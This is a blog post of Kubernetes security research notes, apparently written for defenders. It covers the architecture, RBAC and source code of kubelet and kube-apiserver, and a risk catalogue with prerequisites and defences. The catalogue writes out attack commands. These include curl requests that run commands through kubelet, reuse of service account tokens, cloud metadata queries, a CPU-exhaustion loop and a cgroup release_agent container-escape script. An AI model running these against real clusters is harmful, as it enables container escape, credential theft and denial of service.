---
title: Kubernetes Security Research
layout: post
categories: k8s
tags: k8s cloud
date: 2022-05-15 08:00
excerpt: Kubernetes Security Research
---

{:.table-of-content}
* TOC
{:toc}

# k8s安全研究
> [安全公告](https://groups.google.com/g/kubernetes-security-announce)<br>
> [NSA K8s加固指南](https://github.com/rootsongjc/kubernetes-hardening-guidance/blob/main/kubernetes-hardening-guidance-english.md)

## 基础架构
> 以1.24.3为准

![](/assets/img/k8s_sec1.jpg)

```
--------------------------------------------------------------------------------
Language                      files          blank        comment           code
--------------------------------------------------------------------------------
Go                            14881         500867         923675        3838672
JSON                            446              3              0         890813
YAML                           1294            678           1208         132792
Bourne Shell                    334           6349          12339          31217
Markdown                        441           9213              0          25855
Protocol Buffers                115           5562          18585          11532
PO File                          12           1873          13413          11291
Assembly                         93           2555           2583           9584
PowerShell                        7            392           1017           2470
make                             60            539            895           1999
C/C++ Header                      1            399           4367            839
Bourne Again Shell               12             89             74            773
Lua                               1             30             26            453
sed                               4              4             32            445
Dockerfile                       49            214            705            436
Python                            7            119            159            412
ANTLR Grammar                     1             31             17            138
C                                 5             40             68            133
TOML                              5             24             86             74
INI                               1              2              0             10
HTML                              3              0              0              3
DOS Batch                         1              2             17              2
--------------------------------------------------------------------------------
SUM:                          17773         528985         979266        4959943
--------------------------------------------------------------------------------
```

### 目录结构

| 目录          |  说明        |
| :----------:  |   :-------:  |
| api/          | 存放 OpenAPI/Swagger 的 spec 文件，包括 JSON、Protocol 的定义等 |
| build/        | 存放构建相关的脚本 |
| cmd/          | 存放可执行文件的入口代码，每一个可执行文件都会对应有一个`main`函数 |
| hack/         | 存放与构建、测试相关的脚本 |
| pkg/          | 存放核心库代码，可被项目内部或外部，直接引用 |
| plugin/       | 存放 kubernetes 的插件，例如认证插件、授权插件等 |
| staging/      | 存放部分核心库的暂存代码，也就是还没有集成到`pkg`目录的代码 |
| test/         | 存放测试工具，以及测试数据 |
| third_party/  | 存放第三方工具、代码或其他组件 |
| vendor/       | 存放项目依赖的库代码，一般为第三方库代码 |

### 组件介绍

#### client

- kubectl
	- kuberntes官方提供的命令行工具
	- 以命令行的方式与kube-apiserver组件交互，通信协议是HTTP/JSON，发送HTTP请求到kube-apiserver，kube-apiserver处理并返回结果给kubectl。kubectl将接收到的结果进行展示
- client-go
	- 通过编程的方式与kube-apiserver进行交互，实现与kubectl相同的功能
	- Kubernetes系统的其他组件与kube-apiserver通信的方式都是基于client-go实现

#### master components

- kube-apiserver
	- Kubernetes集群中的所有组件都通过kube-apiserver组件操作资源对象
	- Kubernetes系统中的所有资源对象都封装成RESTful风格的API接口进行管理
	- kube-apiserver是集群中唯一与etcd进行交互的核心组件
	- kube-apiserver拥有丰富的安全访问机制
- kube-controller-manager
	- 负责管理Kubernetes集群中的Node、Pod、Service、Endpoint、Namespace、ServiceAccount、ResourceQuota等
	- 当某个节点意外宕机时，Controller Manager会及时发现并执行自动化修复流程，确保集群始终处于预期的工作状态
	- 管理各种控制器，如DeploymentControllers控制器、StatefulSet控制器、Namespace控制器及PersistentVolume控制器等
	- 控制器通过kube-apiserver提供的接口实时监控整个集群每个资源对象的当前状态，确保系统的实际状态将收敛到期望状态
- kube-scheduler
	- Kubernetes集群的默认调度器，监控整个集群的Pod资源对象和Node资源对象，当监控到新的Pod资源对象时，会通过调度算法为其选择最优节点
  - 调度策略分为预选调度和优选调度两种，预选调度负责找出候选节点，优选调度负责找出最合适的候选节点分，此外Kubernetes还支持优先级调度、抢占机制及亲和性调度等功能

#### node components

- kubelet
	- 运行在Node节点上，主要负责所在节点上的Pod资源对象的管理，例如Pod资源对象的创建、修改、监控、删除、驱逐及Pod生命周期管理等
	- 定期监控所在节点的资源使用状态并上报给kube-apiserver组件，这些数据可以帮助kube-scheduler调度器为Pod资源对象预选节点
	- 对所在节点的镜像和容器做清理工作，保证节点上的镜像不会占满磁盘空间、释放已删除容器的相关资源
	- 实现了3种开放接口
		- Container Runtime Interface(CRI): 定义了一套容器运行时接口，基于grpc通信，使kubelet与容器运行时解耦，由于docker不是基于CRI实现的，kubelet又把docker封装了一层，即dockershim
		- Container Network Interface(CNI): 定义了一套容器网络接口，容器创建时通过CNI插件配置网络，仅负责容器创建时的网络分配和容器删除时释放网络资源
		- Container Storage Interface(CSI)：定义了一套容器存储接口，容器创建时通过CSI插件配置存储卷
- kube-proxy
	- 运行在Node节点上，是Node节点的网络代理
	- 监控kube-apiserver的Service和Endpoint资源变化，并通过iptables/ipvs等配置网络规则，为一组Pod提供统一的TCP/UDP流量转发和负载均衡功能
	- 用来完成Pod-to-Service和External-to-Service网络治理，即对于某个IP:Port的请求，负责将其转发给专用网络上的相应服务或应用程序
	- 与其他负载均衡服务的区别在于，kube-proxy只向Kubernetes服务及其后端Pod发送请求

### 认证鉴权
![](/assets/img/k8s_auth.png)
![](/assets/img/authn-authz-example.png)

#### API Handler
负责提供服务，接收请求<br>
请求会先到`FullHandlerChain`，它是一个`director`对象
```go
// staging/src/k8s.io/apiserver/pkg/server/handler.go
func NewAPIServerHandler(name string, s runtime.NegotiatedSerializer, handlerChainBuilder HandlerChainBuilderFn, notFoundHandler http.Handler) *APIServerHandler {
	// ...
	director := director{
		name:               name,
		goRestfulContainer: gorestfulContainer,
		nonGoRestfulMux:    nonGoRestfulMux,
	}
	return &APIServerHandler{
		FullHandlerChain:   handlerChainBuilder(director),
		GoRestfulContainer: gorestfulContainer,
		NonGoRestfulMux:    nonGoRestfulMux,
		Director:           director,
	}
}
```
如果`goRestfulContainer`的`WebServices`的`RootPath`是`/apis`，或者请求前缀与`RootPath`匹配，则进入`Restful`处理链路
```go
// ServeHTTP makes it an http.Handler
func (a *APIServerHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	a.FullHandlerChain.ServeHTTP(w, r)
}
func (d director) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	path := req.URL.Path

	// check to see if our webservices want to claim this path
	for _, ws := range d.goRestfulContainer.RegisteredWebServices() {
		switch {
		case ws.RootPath() == "/apis":
			// if we are exactly /apis or /apis/, then we need special handling in loop.
			// normally these are passed to the nonGoRestfulMux, but if discovery is enabled, it will go directly.
			// We can't rely on a prefix match since /apis matches everything (see the big comment on Director above)
			if path == "/apis" || path == "/apis/" {
				klog.V(5).Infof("%v: %v %q satisfied by gorestful with webservice %v", d.name, req.Method, path, ws.RootPath())
				// don't use servemux here because gorestful servemuxes get messed up when removing webservices
				// TODO fix gorestful, remove TPRs, or stop using gorestful
				d.goRestfulContainer.Dispatch(w, req)
				return
			}
		case strings.HasPrefix(path, ws.RootPath()):
			// ensure an exact match or a path boundary match
			if len(path) == len(ws.RootPath()) || path[len(ws.RootPath())] == '/' {
				klog.V(5).Infof("%v: %v %q satisfied by gorestful with webservice %v", d.name, req.Method, path, ws.RootPath())
				// don't use servemux here because gorestful servemuxes get messed up when removing webservices
				// TODO fix gorestful, remove TPRs, or stop using gorestful
				d.goRestfulContainer.Dispatch(w, req)
				return
			}
		}
	}
	// if we didn't find a match, then we just skip gorestful altogether
	klog.V(5).Infof("%v: %v %q satisfied by nonGoRestful", d.name, req.Method, path)
	d.nonGoRestfulMux.ServeHTTP(w, req)
}
```

#### Authentication (AuthN)
在TLS连接建立后，会进行认证处理，如果请求认证失败，会拒绝该请求并返回401错误码；如果认证成功，将进行到鉴权的部分，[参考](http://arthurchiao.art/blog/cracking-k8s-authn/)<br>
![](/assets/img/auth-chain.png)

- 用户类型
	- `service account`：k8s管理的用户，该用户由k8s自己创建维护并由其中的app所使用，存储在`secret`中
	- `normal user`：k8s外部用户，由k8s管理创建，通过静态token、证书等方式认证
- 凭证类型
	- `static token`：静态凭证，在`kube-apiserver`启动时指定`--token-auth-file`
	- `证书`：向`kube-apiserver`发送证书签名请求获取签名证书，[参考](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/certificate-signing-requests/)
	- `serviceaccount token`：`kubectl create sa testsa`
	- 其他：LDAP or OIDC

#### Authorization (AuthZ)
Kubernetes支持多种的鉴权模式，例如，ABAC模式，RBAC模式和Webhook模式等，[参考](http://arthurchiao.art/blog/cracking-k8s-authz-rbac/)<br>
![](/assets/img/rbac_elem.png)

##### Subject
访问者
```yaml
subjects:
- kind: User
  name: "test_user"
- kind: ServiceAccount
  name: default
  namespace: kube-system
```
![](/assets/img/rbac-subjects.png)

##### Resource
Resource即API URI的简称，如`pods`就是`/api/v1/namespaces/${namespace}/pods`<br>
```yaml
resources:
- pods
- pods/log
- serviceaccounts
```

##### Operation
即`verb`，表示对`resource`的操作权限，`read-only`包括`get/list/watch`，`write-update-delete`包括`create/patch/delete`
```yaml
verbs:
- get
- list
- watch
```

##### apiGroups
- `built-in`: ""
- `custom`: like "cilium.io"
![](/assets/img/rbac-apigroup.png)

##### Rules
把`apiGroups`、`resources`、`verbs`组合在一起形成一条规则
![](/assets/img/rbac-rule.png)
```yaml
rules:
- apiGroups:
  - ""
  resources:
  - services
  - endpoints
  - namespaces
  verbs:
  - get
  - list
  - watch
```

##### Role
把一条或多条规则组合在一起形成一个角色
![](/assets/img/rbac-role.png)
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: viewer
rules:
- apiGroups:
  - ""
  resources:
  - pods
  verbs:
  - get
  - list
```

##### RoleBinding
把`Role`赋予给`subject`
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: role-binding-for-app1
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: viewer
subjects:
- kind: ServiceAccount
  name: sa-for-app1
  namespace: default
```

##### ClusterRole
`ClusterRole`、`ClusterRoleBinding`类似`Role`和`RoleBinding`，区别在于`Role`必须指定`namespace`，而`ClusterRole`是全局的

#### Admission
- 首先进入变更准入控制器`Mutating Admission`，它可以修改被它接受的对象，这就引出了它的另一个作用，将相关资源作为请求处理的一部分进行变更
- 再进入验证准入控制器`Validating Admission`，它只能进行验证，不能进行任何资源数据的修改操作

##### 内置控制器
`kube-apiserver --help |grep admission-plugins`，[参考](https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#what-does-each-admission-controller-do)

##### 动态控制器
使用`MutatingAdmissionWebhook`和`ValidatingAdmissionWebhook`指定自己搭建的HTTP服务器来处理`kube-apiserver`发来的`AdmissionReview`
- `Mutating Webhook`的处理是串行的，而`Validating Webhook`是并行处理的
- `Mutating Webhook`虽然处理是串行的，但是并不保证顺序
- 注意对`Mutating Webhook`的处理做到幂等性，以免结果不符合预期
- 请求处理时，注意要处理资源对象的所有API版本

### 编译构建

#### 普通编译
![](/assets/img/k8s_normal_make.svg)

#### 镜像编译
![](/assets/img/k8s_make_image.svg)

### 代码分析

#### kubectl

#### kubelet
![](/assets/img/k8s_sec7.png)

##### init
通过`NewMainKubelet`函数创建`kubelet`对象并初始化各种`manager`
![](/assets/img/kubelet_init.png)

##### Server
kubelet server监听在10250/10255端口，开放了一些API，可通过HTTP/HTTPS访问。主要代码在`server/server.go`中，`NewServer`函数负责创建服务，主要包含三个部分：
- InstallDefaultHandlers：默认API，`/healthz、/pods、/stats/[summary, {podName}/{containerName}, {namespace}/{podName}/{uid}/{containerName}]、/metrics`
- InstallDebuggingHandlers：调试API，默认开启，`/run、/exec、/attach、/portForward、/logs(读取/var/log目录下的文件)、/containerLogs、/runningpods、/debug/pprof/[profile, symbol, cmdline, trace]`、/debug/flags/v
![](/assets/img/kubelet_server.svg)

##### Manager
kubelet包含各种Manager来进行状态管理，在`syncLoop`中处理状态变更产生的各种事件
- `imageManager`用来管理镜像
- `serverCertificateManager`用来管理kubelet证书，实现证书自动轮转
- `oomWatcher`用来监控内存使用
- `resourceAnalyzer`用来收集卷使用数据
- `volumeManager`用来管理Pod所使用的卷
- `statusManager`用来和apiserver同步pod的状态
- `PLEG`用来监控pod的生命周期
- `podManager`用来管理pod

![](/assets/img/kubelet_module.svg)

- [PLEG](https://developers.redhat.com/blog/2019/11/13/pod-lifecycle-event-generator-understanding-the-pleg-is-not-healthy-issue-in-kubernetes)：定期检查节点上Pod运行情况，如果发现感兴趣的变化，PLEG就会把这种变化包装成Event发送给Kubelet的主同步机制syncLoop去处理
![](/assets/img/k8s_sec2.png)
	- 在`SyncLoop`中检查`PLEG`的健康状态，如果超过3分钟没有更新则报错
	![](/assets/img/k8s_sec3.png)
	- `kubelet.go:NewMainKubelet`中创建`pleg.NewGenericPLEG`，默认1秒`relist`一次更新pod状态
	![](/assets/img/k8s_sec4.png)
	- `relist`调用`runtime.GetPods`获取`pod`的状态(Running、Existed、Unknow、NonExisted)
	![](/assets/img/k8s_sec5.png)
	- `SyncLoop`消费`PLEG`消息，执行相应处理
	- [其他分析文章](https://wenfeng-gao.github.io/post/k8s-pleg-source-code-analysis/)

- [PodConfig](https://developpaper.com/kubelet-source-code-analysis-monitoring-pod-changes/)：持续监测本地manifest、manifest url、apiserver处的Pod配置变化，主要代码实现在`config`目录下
![](/assets/img/k8s_sec6.png)
	- [Pod删除时发生了什么](https://wenfeng-gao.github.io/post/source-code-kubelet-what-happened-to-kubelet-when-pod-is-deleted/)
- [SyncLoop](https://www.alibabacloud.com/blog/understanding-the-kubelet-core-execution-frame_593904)
![](/assets/img/k8s_sec10.png)
	- configCh：接收`PodConfig`消息，根据消息内容执行`syncPod`
	![](/assets/img/k8s_sec8.png)
	- plegCh：接收`PLEG`消息，如果消息不是`ContainerRemoved`则调用`handler.HandlePodSyncs`，回收`Pod`中停止的容器。比如用`docker stop`停止一个容器，`plegCh`就会返回`ContainerDied`消息，`kubelet`会重启这个容器
	- syncCh：计时器，每秒触发去同步`Pod`配置
	- houseKeepingCh：计时器，每两秒触发，调用`HandlePodCleanups`回收停止的`Pod`的资源
	- [其他分析文章](https://www.cnblogs.com/luozhiyun/p/13736569.html)

#### kube-apiserver
![](/assets/img/k8s_sec12.png)

kube-apiserver包含三种APIServer和一个bootstrap-controller，三种APIServer在`CreateServerChain()`中创建，并通过delegation串联在一起<br>
- `aggregatorServer`：负责处理 apiregistration.k8s.io 组下的APIService资源请求，同时将来自用户的请求拦截转发给aggregated server
- `kubeAPIServer`：负责对请求的一些通用处理，包括：认证、鉴权以及各个内建资源(pod, deployment，service and etc)的REST服务等
- `apiExtensionsServer`：负责CustomResourceDefinition（CRD）apiResources以及apiVersions的注册，同时处理CRD以及相应CustomResource（CR）的REST请求(如果对应CR不能被处理的话则会返回404)，也是apiserver Delegation的最后一环
- `bootstrap-controller`：主要负责Kubernetes default apiserver service的创建以及管理，包括命名空间（如default、kube-system等）、service endpoint、clusterIP等
- `go-restful`：APISserver就是一个实现了REST API的WebServer，最终使用golang的net/http库中的Server运行起来的，按照`go-restful`原理包含以下组件
	- `Container`：一个Container包含多个WebService
	- `WebService`：一个WebService包含多条route
	- `Route`：一条route包含一个method、一个具体的path和一个响应的handler

##### aggregatorServer
aggregator是APIServer的一种扩展，可以让APISserver和外部的APIServer进行联动，`CreateServerChain()`最终返回的Server对象就是aggregatorServer。在创建AggregatorServer时，KubeAPIServer和APIExtensions中的资源组，即GroupVersion，会被转换成Aggregator的APIService对象，注册到Aggregator中，并且整个APIServer的入口，其实是Aggregator的GenericAPIServer <br>
- `apiserviceRegistrationController`：负责根据APIService定义的aggregated server service构建代理，并讲处理函数注册到对应的URI上
- `availableConditionController`：维护APIServices的可用状态，包括其引用Service是否可用等等
- `autoRegistrationController`：内部定义了一个队列，用来保存添加进来的APIService对象，这些APIService可能是KubeAPIServer或者APIExtensions APIServer转换过来的，也可能是通过APIService的API直接添加进来的，然后在kube-apiserver-autoregistration PostStartHook中启动这个Controller，通过不断轮询，将队列中的APIService取出，然后调用apiservice对应的API，将他们添加或者更新到etcd数据库中，固化下来
- `crdRegistrationController`：将APIExtensions APIServer中定义的CRD对象转换成APIService，注册到autoRegistrationController的队列中
- `openAPIAggregationController`：将APIServices资源的变化同步至提供的OpenAPI文档
![](/assets/img/aggregator.svg)
在创建完aggregatorServer后，启动Server，根据注册的APIService分发api请求到内部或外部的APIServer
![](/assets/img/aggregator_run.svg)

##### kubeAPIServer
kubeAPIServer是整个Kubernetes apiserver的核心，主要提供对内建API Resources的操作请求，为Kubernetes中各API Resources注册路由信息，同时暴露RESTful API，使集群中以及集群外的服务都可以通过RESTful API操作Kubernetes中的资源<br>
kubeAPIServer核心的功能：<br>
- 调用DefaultBuildHandlerChain注册过滤器链，包括认证、鉴权等检查操作
- 调用InstallLegacyAPI将核心API Resources添加到路由中，在apiserver中即是以/api开头的resource
- 调用InstallAPIs将扩展的API Resources添加到路由中，在apiserver中即是以/apis开头的resource

![](/assets/img/k8s_sec14.png)
当请求到达kube-apiserver时，kube-apiserver首先会执行注册的过滤器链，当过滤完成后，请求会通过route进入到对应的handler中，handler中的操作主要是通过RESTStorage与etcd交互
![](/assets/img/k8s_sec13.png)
代码执行流程
![](/assets/img/apiserver.svg)

##### apiExtensionsServer
apiExtensionsServer主要负责CustomResourceDefinition（CRD）apiResources以及apiVersions的注册，同时处理CRD以及相应CustomResource（CR）的REST请求(如果对应CR不能被处理的话则会返回404)，也是apiserver Delegation的最后一环
- `openapiController`：将crd资源的变化同步至提供的 OpenAPI 文档，可通过访问/openapi/v2进行查看
- `crdController`：负责将crd信息注册到apiVersions和apiResources中，两者的信息可通过`kubectl api-versions`和`kubectl api-resources`查看
- `namingController`：检查crd obj中是否有命名冲突，可在crd.status.conditions中查看
- `establishingController`：检查crd是否处于正常状态，可在crd.status.conditions中查看
- `nonStructuralSchemaController`：检查crd obj结构是否正常，可在crd.status.conditions中查看
- `apiApprovalController`：检查crd是否遵循kubernetes API声明策略，可在crd.status.conditions中查看
- `finalizingController`：类似于finalizes的功能，与CRs的删除有关
![](/assets/img/apiextension.svg)

#### kube-controller-manager
kube-controller-manager是k8s集群的大脑，由一些列控制器组成，如：Replication Controller、Node Controller、Daemon Controller、Deployment Controller等等。每一个控制器都基于client-go库实现对apiserver资源的监控，当资源更改时执行对应的回调函数
##### start代码执行流程
![](/assets/img/controller_manager.svg)
##### Controller实现逻辑
![](/assets/img/custom_controller.jpg)
- 向Informer注册需要处理的Resource的Handler
- 当Resource出现更改时，Informer调用Handler，Handler把任务项加入处理队列中
- workers（处理线程）从处理队列中读取任务项并进行处理
##### Deployment Controller源码分析
![](/assets/img/deployment_controller.svg)

#### kube-scheduler

#### kube-proxy

## 配置安全

### 基线检查

#### 文档

- [Rancher_Benchmark_Assessment v2.4](https://releases.rancher.com/documents/security/2.4/Rancher_Benchmark_Assessment.pdf)
- [CIS Google Kubernetes Engine (GKE) Benchmark v1.0.0](https://github.com/cismirror/old-benchmarks-archive/blob/master/CIS%20Google%20Kubernetes%20Engine%20(GKE)%20Benchmark%20v1.0.0.pdf)

#### 工具

- [kubernetes-cis-benchmark](https://github.com/neuvector/kubernetes-cis-benchmark)
- [kube-bench](https://github.com/aquasecurity/kube-bench)
- [rbac检查工具介绍](https://icloudnative.io/posts/tools-and-methods-for-auditing-kubernetes-rbac-policies/)
- [镜像签名工具](https://github.com/sigstore/cosign)

#### Golang

- [go语言常见安全问题](https://www.elttam.com/blog/golang-codereview/)

### 风险

#### kubectl authentication helpers execute command
> https://banzaicloud.com/blog/kubeconfig-security/

- Prerequisites
	- attacker control the kubeconfig
- Flow<br>
while cluster manager service use user provided kubeconfig to manage user's k8s cluster, a malicious user can use kubectl authentication helpers to execute arbitrary command when kubeconfig is loaded
	- exec helper
	- gcp helper
- Defence<br>
validate yaml and disable auth-provider

#### kube-apiserver unauthenticated access
- Prerequisites
	- `--insecure-port` is not set to 0
- Flow<br>
attacker access kube-apiserver insecure port, such as 8080
- Defence<br>
`--insecure-port` set to 0

#### kube-apiserver anonymous access
- Prerequisites
	- `--anonymous-auth` not set or set to true
- Flow<br>
attacker can access kube-apiserver without credentials
- Defence<br>
`--anonymous-auth` set to false

#### use static credentials to access kube-apiserver
- Prerequisites
	- `kube-apiserver` use `--basic-auth-file` or `--token-auth-file`
	- `kube-apiserver` do not enable `NodeRestriction` admission
	- `kube-apiserver` contain `AlwaysAllow` or `Node` in `--authorization-mode`
	- do not delete kubelet's `--bootstrap-kubeconfig`
- Flow<br>
```shell
curl -sk --connect-timeout 5 -H "Authorization: Bearer $token" https://${apiserver}
curl -sk --connect-timeout 5 -H "Authorization: Basic $token" https://${apiserver}
curl -sk --connect-timeout 5 --cert ./${kubelet_cert} --key ./${kubelet_cert_key} https://${apiserver}/api/v1/secrets
```
- Defence<br>
	- do not use static credentials
	- delete bootstrap-kubeconfig file or bootstrap-kubeconfig user

#### kube-apiserver unauthorized access
- Prerequisites
	- `--authorization-mode` set to `AlwaysAllow`
- Flow<br>
```shell
curl -sk --connect-timeout 5 -H "Authorization: Bearer $token" https://${apiserver}/api/v1/pods
```
- Defence<br>
`--authorization-mode` set to RBAC

#### kubelet unauthenticated access
> https://github.com/cyberark/kubeletctl

- Prerequisites
	- `--anonymous-auth` not set or set to true
	- `--read-only-port` not set to 0
	- `--authorization-mode` not set to Webhook
	- pod network can access host network
- Flow<br>
when attacker can access kubelet, such as run commands or trigger ssrf in pod, he can fetch metrics information from 10255, control node from 10250
	- get all pods information<br>
```shell
curl -sk --connect-timeout 5 https://${ip}:10250/pods
```
	- select privileged container to execute command<br>
```shell
curl -sk --connect-timeout 5 https://${ip}:10250/run/${namespace}/${pod}/${container} -d "cmd=xxx"
```
- Defence<br>
	- `--anonymous-auth` set to false, `--read-only-port` set to 0, `--authorization-mode` set to Webhook
	- use networkpolicy, [reference](https://raesene.github.io/blog/2018/03/25/kubernetes-network-policies/)
	- use iptables
```shell
# deny container access host
iptables -I INPUT -s ${container_net} -p tcp -m multiport --dports 10250:10255 -j DROP
# deny container access other node
iptables -I FORWARD -s ${container_net} -p tcp -m multiport --dports 10250:10255 -m state --state NEW -j DROP
```

#### metadata access
- Prerequisites
	- attacker can run commands or trigger ssrf in pod
	- pod network can access 169.254.169.254
- Flow<br>
```shell
curl -sk --connect-timeout 5 http://169.254.169.254/openstack/latest/meta_data.json
curl -sk --connect-timeout 5 http://169.254.169.254/openstack/latest/network_data.json
curl -sk --connect-timeout 5 http://169.254.169.254/openstack/latest/user_data
```
- Defence<br>
	- use networkpolicy
	- use iptables
```shell
iptables -I OUTPUT -s ${container_net} -d 169.254.169.254 -j DROP
iptables -I FORWARD -s ${container_net} -d 169.254.169.254 -j DROP
```

#### service account token access
- Prerequisites
	- `kube-apiserver` do not disable `ServiceAccount` admission
	- mount service account secret `automountServiceAccountToken: true`
	- `--authorization-mode` of `kubelet` is set to `AlwaysAllow`
- Flow<br>
```shell
curl -sk --connect-timeout 5 -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://${apiserver}
curl -sk --connect-timeout 5 -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://${ip}:10250/pods
```
- Defence<br>
	- do not mount service account token
	- `kubelet` set `--authorization-mode` to `Webhook`

#### resourse occupation
- Prerequisites
	- do not use `LimitRange` in `namespace` or do not use `limits` in pod create
- Flow<br>
```shell
for((i=0;i<8;i++));do bash -c "while :;do a=a;done &";done
```
- Defence<br>
use `LimitRange` or `limits`

#### privileged container
- Prerequisites
	- create pod with `"securityContext": { "privileged": true }`
- Flow<br>
```shell
mount /dev/vda1 /mnt
```
- Defence<br>
	- do not set `privileged` flag
	- `kube-apiserver` set `--allow-privileged` to false

#### use root user to escape
- Prerequisites
	- run container with root 
- Flow<br>
```shell
# obtain all capabilities
unshare -UCmr bash
# use cgroup to escape
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^.]*\)/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 2
cat /output
```
- Defence<br>
	- do not use root in container
	- if there are some initial actions required root, use [init container](https://kubernetes.io/docs/concepts/workloads/pods/init-containers/) or seperate root and normal process in different container
	- disable user namespace via `echo 0 > /proc/sys/user/max_user_namespaces`
	- specify `fsGroup`、`runAsUser`、`runAsGroup` in `securityContext`

#### write hostpath
- Prerequisites
	- use hostPath while creating pod
- Flow<br>
when pods use the same hostPath, a malicious user in one pod can modify files in hostPath and affect other pod
- Defence<br>
make hostPath readonly via 'volumeMounts: {"readOnly": true}', [reference](https://suraj.io/post/k8s-hostpat-nuke-nodes/)
	
#### privilege escalation in container
- Prerequisites
	- unsafe sudo config
	- unsafe root process in container
	- unsafe setcap binary
	- unsafe system, has exploitable cve
	- unsafe suid binary
	- unsafe runtime capabilities
- Flow<br>
use vulnerabilities to escalate privilege
- Defence<br>
	- run container with normal user and default capabilities
	- set '"securityContext": {"allowPrivilegeEscalation": false}'

#### kernel vulnerabilities
- Prerequisites
	- kernel has exploitable vulnerabilities
	- user in container can trigger the vulnerability
- Flow<br>
use Dirty-Cow、Dirty-Pipe or other vulnerabilities
- Defence<br>
	- update kernel with all security patches
	- use seccomp
	- disable unprivileged bpf, `kernel.unprivileged_bpf_disabled = 1`
	- disable kernel module autoload, `kernel.modules_disabled = 1`

#### access host network
- Prerequisites
	- none
- Flow<br>
	- guess host ip address
	- access host ssh service and brute-force password
- Defence<br>
	- deny high risk ports access from container
```shell
# deny container access host
iptables -I INPUT -s ${container_net} -p tcp -m multiport --dports 22 -j DROP
# deny container access other node
iptables -I FORWARD -s ${container_net} -p tcp -m multiport --dports 22 -m state --state NEW -j DROP
```

#### access docker service
- Prerequisites
	- mount docker.sock in container
	- docker enable remote api
- Flow<br>
use docker.sock or remote api to create privileged container
- Defence<br>
	- do not mount docker.sock in container
	- disable docker remote api

## 组件安全

### kubectl
Kubernetes命令行工具，使得你可以对Kubernetes集群运行命令，如使用kubectl来部署应用、监测和管理集群资源以及查看日志等等

#### 漏洞

- [CVE-2018-1002100 kubectl cp path escape](https://github.com/noirfate/k8s_debug/tree/main/CVE-2018-1002100)
- [CVE-2019-1002101 kubectl cp path escape](https://github.com/noirfate/k8s_debug/tree/main/CVE-2019-1002101)
- [CVE-2019-11246 kubectl cp path escape](https://github.com/noirfate/k8s_debug/tree/main/CVE-2019-11246)
- [CVE-2019-11249 kubectl cp path escape](https://github.com/noirfate/k8s_debug/tree/main/CVE-2019-11249)
- [CVE-2019-11251 kubectl cp path escape](https://github.com/noirfate/k8s_debug/tree/main/CVE-2019-11251)

#### 挖掘思路
对于客户端漏洞，主要攻击方式为构造恶意的服务端，目前已发现的漏洞都是`kubectl cp`的路径穿越漏洞，恶意的服务端为恶意容器，作为`kubectl`的主要交互对象`kube-apiserver`，目前尚未有通过恶意的`kube-apiserver`来攻击`kubectl`的案例。大体思路如下：

- 恶意容器
- 恶意`kube-apiserver`

### kubelet
kubelet是在每个Node节点上运行的主要 “节点代理”，接受通过各种机制（主要是通过 apiserver）提供的一组PodSpec，并确保这些PodSpec中描述的容器处于运行状态且运行状况良好

#### 命令行/配置
> 修改`/etc/systemd/system/kubelet.service.d/10-kubeadm.conf`变更启动参数，执行`systemctl daemon-reload`加载新配置，重启`systemctl restart kubelet`

- `--enable-debugging-handlers`，默认是`true`，关闭它则不能通过`kubelet`进入容器执行命令或查看日志了，相关代码见`pkg/kubelet/server.go:InstallDebuggingHandlers`
- `--anonymous-auth`，默认是`true`，允许匿名访问，须设置成false
- `--authorization-mode`，没有设置`--config`时默认是`AlwaysAllow`，须设置为`Webhook`，`Webhook`使用`apiserver`的`SubjectAccessReview`进行鉴权
- `--bootstrap-kubeconfig`，`kubelet`使用`bootstrap-token`向`apiserver`申请证书，生成配置，[官方文档](https://kubernetes.io/zh/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)、[参考1](https://suraj.io/post/add-new-k8s-node-bootstrap-token/)、[参考2](https://suraj.io/post/2021/02/k8s-bootstrap-token/)
- `--read-only-port`，默认是10255，无认证，须设置为0，禁用只读访问
- `--streaming-connection-idle-timeout`，空闲连接超时默认为4小时，可能会造成拒绝服务，建议设置为5m
- `--protect-kernel-defaults`，设置为true，禁止kubelet修改内核参数
- `--feature-gates=RotateKubeletServerCertificate=true`，kubelet在证书即将到期前自动发送csr请求，申请新证书

#### 漏洞

- [CVE-2017-1002101 hostPath symbol link path escape](https://github.com/noirfate/k8s_debug/tree/main/CVE-2017-1002101)
- [CVE-2021-25741 subpath TOCTOU](https://github.com/noirfate/k8s_debug/tree/main/CVE-2021-25741)

#### 挖掘思路
`kubelet`为部署在节点的服务，用于管理`pod`生命周期，已发现的漏洞均是在创建`pod`时挂载宿主机目录导致的路径穿越，大体思路如下：

- 与`kubelet`相关的`pod`配置
- 恶意`kube-apiserver`
- 恶意`webhook`控制器

### kube-apiserver
Kubernetes API服务器验证并配置API对象的数据， 这些对象包括pods、services、replicationcontrollers等。 API服务器为REST操作提供服务，并为集群的共享状态提供前端，所有其他组件都通过该前端进行交互

#### 命令行/配置

- `--allow-privileged`，默认是`false`，设为`true`时允许创建特权容器
- `--anonymous-auth`，默认是`true`，允许匿名请求，用户名为`system:anonymous`，用户组为`system:unauthenticated`
- `--enable-bootstrap-token-auth`，启用以允许将`kube-system`名字空间中类型为`bootstrap.kubernetes.io/token`的`Secret`用于TLS引导身份验证
- `--token-auth-file`，设置认证令牌，该令牌长期有效，在不重启的情况下无法修改，文件格式为`csv`，内容为`token,user,uid,"group1,group2,group3"`
- `--log-dir`, 设置日志存储路径，需配合`--logtostderr=false`使用，之后可使用restapi访问日志`https://ip:port/logs/`
- `--basic-auth-file`, 启用静态Basic认证，设置时指定cvs文件，格式为`password,username,uid`
